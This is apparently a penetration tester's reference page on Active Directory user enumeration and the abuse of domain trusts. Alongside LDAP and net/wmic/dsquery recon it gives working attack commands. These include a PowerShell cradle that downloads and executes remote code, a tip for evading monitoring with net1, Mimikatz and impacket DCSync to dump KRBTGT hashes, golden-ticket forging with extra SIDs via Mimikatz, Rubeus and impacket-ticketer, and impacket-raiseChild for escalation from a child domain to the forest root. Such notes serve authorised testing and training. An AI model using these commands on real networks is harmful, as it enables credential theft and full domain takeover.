+++
title = "AD: User Enumeration"
+++

# User Enumeration

"A tool to quickly bruteforce and enumerate valid Active Directory accounts through Kerberos Pre-Authentication"
- https://github.com/ropnop/kerbrute
- Username Lists
    - https://github.com/initstring/linkedin2username
    - https://github.com/insidetrust/statistically-likely-usernames
- PowerShell Tool: https://github.com/dafthack/DomainPasswordSpray

{{< embed-section page="Docs/5 - Exploitation/online-credentials-attacks" header="user-enum" >}}

## PowerShell (ADSI searcher)

Uses [System.DirectoryServices] (ADSI/LDAP) so it works from any domain-joined host without the Active Directory RSAT module.

- Ref: https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.directorysearcher

```powershell
# Equivalent to: Get-ADDomain (defaultNamingContext) — RootDSE and default naming context (reuse $defaultNC below)
$root = [ADSI]"LDAP://RootDSE"
$defaultNC = $root.defaultNamingContext.Value

# Equivalent to: Get-ADDomain — Basic domain info
$domain = [ADSI]"LDAP://$defaultNC"
$domain.Name

# Equivalent to: Get-ADUser -Filter {ServicePrincipalName -like "*"} -Properties ServicePrincipalName — Search for Kerberoastable accounts (requires Domain user)
# (request a TGS for a service in an attempt to crack the service's password, which its hash is used to encrypt the TGS)
$searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]"LDAP://$defaultNC")
$searcher.Filter = "(&(objectCategory=user)(servicePrincipalName=*))"
$searcher.PropertiesToLoad.Add("servicePrincipalName") | Out-Null
$searcher.PropertiesToLoad.Add("samAccountName") | Out-Null
$searcher.FindAll()

# Equivalent to: Get-ADTrust — Domain trust relationships (trustedDomain objects under CN=System)
$sysNC = "CN=System," + $defaultNC
$trustSearcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]"LDAP://$sysNC")
$trustSearcher.Filter = "(objectClass=trustedDomain)"
$trustSearcher.PropertiesToLoad.Add("name") | Out-Null
$trustSearcher.FindAll()

# Equivalent to: Get-ADGroup -Filter * — Group enumeration (all group names)
$searcher.Filter = "(objectCategory=group)"
$searcher.PropertiesToLoad.Clear(); $searcher.PropertiesToLoad.Add("samAccountName") | Out-Null
$searcher.FindAll() | ForEach-Object { $_.Properties["samaccountname"][0] }

# Equivalent to: Get-ADGroup -Identity <GROUP_NAME> — Single group by name
$searcher.Filter = "(&(objectCategory=group)(samAccountName=<GROUP_NAME>))"
$searcher.PropertiesToLoad.Add("distinguishedName") | Out-Null
$groupResult = $searcher.FindOne()
$groupDN = $groupResult.Properties["distinguishedname"][0]

# Equivalent to: Get-ADGroupMember -Identity <GROUP_NAME> — Group members (member attribute contains DNs)
$groupEntry = [ADSI]"LDAP://$groupDN"
$groupEntry.Properties["member"].Value
```

## PowerView (deprecated)

- Original: https://github.com/PowerShellMafia/PowerSploit
- Maintained: https://github.com/BC-SECURITY/Empire/blob/main/empire/server/data/module_source/situational_awareness/network/powerview.ps1

Although "dated" code-wise and heavily flagged by Security Products the underlying LDAP queries have not changed, and it is still functional.

```bash
# Enum users
# https://powersploit.readthedocs.io/en/latest/Recon/Get-DomainUser/
Get-DomainUser -Identity <USER> -Domain <DOMAIN> | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol

# Enum Domain Admins
# https://powersploit.readthedocs.io/en/latest/Recon/Get-DomainGroupMember/
Get-DomainGroupMember -Identity "Domain Admins" -Recurse

# Enum Domain Trusts
Get-DomainTrustMapping

# Test Admin access locally or remotely
# https://powersploit.readthedocs.io/en/latest/Recon/Test-AdminAccess/
Test-AdminAccess -ComputerName <MACHINE>

# Kerberostable accounts
Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName
```

### SharpView

.NET port of PowerView... usually has same functions and syntax. Useful when a host or network has PowerShell hardening.

## Living Off the Land (Native Binaries)

Typically, these log less and not flagged as much as pulling external tools. Especially in offline or segmented environments these can be more useful.

{{< embed-section page="Docs/6 - Post-Exploitation/security-products" header="windows-defender,windows-firewall" >}}

### Initial Survey

#### DOS Version

```bash
# Am I Alone??
quser
qwinsta

# All-in-1 Info Command
systeminfo

# Hostname, Domain, DC, env vars
hostname
echo %USERDOMAIN%
echo %logonserver%
set
# OS Version
ver.exe
# Security Patches (Hotfixes)
wmic qfe get Caption,Description,HotFixID,InstalledOn

# Network Information
ipconfig /all
arp -a
route print
netstat -anob
netsh advfirewall show allprofiles
```

#### WMI Version

- WMIC Cheatsheet: https://gist.github.com/xorrior/67ee741af08cb1fc86511047550cdaf4

```bash
# Basic Host Info
wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List

# Basic Domain Info
wmic ntdomain get Caption,Description,DnsForestName,DomainName,DomainControllerAddress

# Security Patches
wmic qfe get Caption,Description,HotFixID,InstalledOn

# Process List
wmic process list /format:list

# Domain and DC Info
wmic ntdomain list /format:list

# Users on the Domain
wmic useraccount list /format:list

# Local Groups Info
wmic group list /format:list

# System Accounts Info
wmic sysaccount list /format:list
```

#### `net` Version

These could be potentially heavily monitored. Try `net1` instead of `net` will execute the same functions without the potential trigger from the net string.

```bash
# Information about password requirements
net accounts

# Password and lockout policy
net accounts /domain

# Information about domain groups
net group /domain

# List users with domain admin privileges
net group "Domain Admins" /domain

# List of PCs connected to the domain
net group "Domain Computers" /domain

# List PC accounts of domains controllers
net group "Domain Controllers" /domain

# User that belongs to the group
net group <DOMAIN_GROUP> /domain

# List of domain groups
net groups /domain

# All available groups
net localgroup

# List users that belong to the administrators group inside the domain
net localgroup administrators /domain

# Information about a group (admins)
net localgroup Administrators

# Add user to administrators
net localgroup administrators <USER> /add

# Check current shares
net share

# Get information about a user within the domain
net user /domain <USER>

# List all users of the domain
net user /domain

# Information about the current user
net user %username%

# Mount the share locally
net use Z: \\<TARGET>\<SHARE>

# Get a list of computers
net view

# Shares on the domains
net view /all /domain[:<DOMAIN>]

# List shares of a computer
net view \\<TARGET> /ALL

# List of PCs of the domain
net view /domain
```

#### `dsquery` Version

- https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc732952(v=ws.11)
- Wildcard: https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc754232(v=ws.11)
- LDAP OID: https://ldap.com/ldap-oid-reference-guide/
    - https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/useraccountcontrol-manipulate-account-properties

Native tool to find AD objects. Only exists on hosts installed with `Active Directory Domain Services Role` and at `C:\Windows\System32\dsquery.dll`.

```bash
# Query all users or computers
dsquery user
dsquery computer

# Query filter for all users in a Domain
dsquery * "CN=Users,DC=<DOMAIN>,DC=<TOPLEVEL_DOMAIN>"

# Users With Specific Attributes Set (PASSWD_NOTREQD)
# 1.2.840.113556.1.4.803:=32 means PASSWD_NOTREQD must be set
dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl

# Search DCs in Current Domain
dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr sAMAccountName

# Search disabled accounts
dsquery * -filter "(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=2)(adminCount=1)(description=*))" -limit 5 -attr SAMAccountName description
```

{{< img src="LDAP-OID-UAC-values.png" caption="User Account Control Bit Values" >}}

#### PowerShell Version

{{< embed-section page="Docs/6 - Post-Exploitation/security-products" header="bypass-execution-policy" >}}

```bash
Get-Module
Get-ExecutionPolicy -List
Set-ExecutionPolicy Bypass -Scope Process
Get-ChildItem Env: | ft Key,Value
Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt
# Pull any other tools via HTTP
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('<DOWNLOAD_URL>');"
```

## Domain Trusts

```powershell
# Search for trusts (ADSI – no RSAT required)
$root = [ADSI]"LDAP://RootDSE"
$defaultNC = $root.defaultNamingContext.Value
$sysNC = "CN=System," + $defaultNC
$searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]"LDAP://$sysNC")
$searcher.Filter = "(objectClass=trustedDomain)"
$searcher.PropertiesToLoad.Add("name") | Out-Null
$searcher.FindAll()

# Or use PowerView
Import-Module .\PowerView.ps1
Get-DomainTrust
Get-DomainTrustMapping
Get-DomainUser -Domain <DOMAIN> | select SamAccountName

netdom query /domain:<DOMAIN> trust

# Using netdom to query workstations and servers
netdom query /domain:<DOMAIN> workstation
```

{{< embed-section page="Docs/9 - Notes/bloodhound" header="domain-trusts" >}}

### Abusing access between Domain Trusts

- SID History: https://learn.microsoft.com/en-us/windows/win32/adschema/a-sidhistory
- SID Filtering: https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/55fc19f2-55ba-4251-8a6a-103dd7c66280
    - often disabled by default to allow seamless migration
- Well-known SIDs: https://adsecurity.org/?p=1001

This normally occurs when a privileged user is migrated from one domain to another, and there is no SID filtering in place.

The following are required to do this attack via Mimikatz:
- child domain's
    - KRBTGT hash
        - (Linux) or privileged user creds that can access the domain
    - SID
    - FQDN
    - name of a target user (does not need to exist!)
- root domain's
    - SID of the Enterprise Admins group

#### via Windows

```bash
# Obtaining the KRBTGT Account's NT Hash using Mimikatz and Domain SID
.\mimikatz.exe 'lsadump::dcsync /user:<DOMAIN>\krbtgt'

## REMEMBER: above this SID is for the user... but it contains the domain/group portion. Just cut off the number after the last '-' section

Import-Module .\PowerView.ps1
Get-DomainSID

# Obtaining Enterprise Admins Group's SID using Get-DomainGroup
Get-DomainGroup -Domain <DOMAIN> -Identity "Enterprise Admins" | select distinguishedname,objectsid

# BEFORE: Verify no ticket
klist
ls \\<DC_FQDN>\c$

# Create GOLDEN TICKET
# NOTE: the user matters only for logging
.\mimikatz.exe 'kerberos::golden /ptt /user:<USER> /domain:<TARGET_DOMAIN> /sid:<TARGET_DOMAIN_SID> /krbtgt:<KRBTGT_HASH> /sids:<TARGET_SID>'

# AFTER: Verify ticket creation and no access
klist
ls \\<DC_FQDN>\c$

===

# Rubeus method
.\Rubeus.exe golden /rc4:<KRBTGT_HASH> /domain:<TARGET_DOMAIN> /sid:<TARGET_DOMAIN_SID> /sids:<TARGET_SID> /user:<USER> /ptt

# Then DCSYNC attack via Mimikatz
lsadump::dcsync /user:<DOMAIN>\<USER> /domain:<TARGET_DOMAIN>
```

#### via Linux

Individually...

```bash
# Performing DCSync with secretsdump.py
impacket-secretsdump <DOMAIN>/<USER>:'<PASSWORD>'@<DC_IP> -just-dc-user <TARGET_DOMAIN>/krbtgt

# Domain SID
impacket-lookupsid <DOMAIN>/<USER>:'<PASSWORD>'@<DC_IP> | grep "Domain SID"

# GOLDEN TICKET attack
impacket-ticketer -nthash <KRBTGT_HASH> -domain <TARGET_DOMAIN> -domain-sid <TARGET_DOMAIN_SID> -extra-sid <TARGET_SID> <USER>
export KRB5CCNAME="$(pwd)/<USER>.ccache"

# !!! use something like psexec to access !!!
```

...or all-in-one script, but with **GREAT CAUTION and UNDERSTANDING how this could negatively impact the target**

```bash
# NOTE: will prompt for password
impacket-raiseChild -target-exec <DC_IP> <TARGET_DOMAIN>/<USER>

# can use administrator hash from output to secretsdump.py for a user
```
